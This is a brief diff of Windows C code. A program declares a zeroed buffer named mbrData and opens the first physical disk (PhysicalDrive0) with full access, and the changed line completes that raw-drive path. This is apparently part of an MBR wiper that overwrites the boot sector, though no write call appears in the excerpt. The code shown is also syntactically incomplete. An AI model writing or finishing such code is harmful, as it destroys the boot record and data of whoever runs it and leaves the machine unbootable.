@@ -8,7 +8,7 @@ int main() {
     char mbrData[MBR_SIZE]; 
     ZeroMemory(&mbrData, (sizeof mbrData));
 
-    HANDLE MasterBootRecord = CreateFile("\\\\\\PhysicalDrive"
+    HANDLE MasterBootRecord = CreateFile("\\\\\\PhysicalDrive0"
     GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
     , NULL, OPEN_EXISTING, NULL, NULL)
 
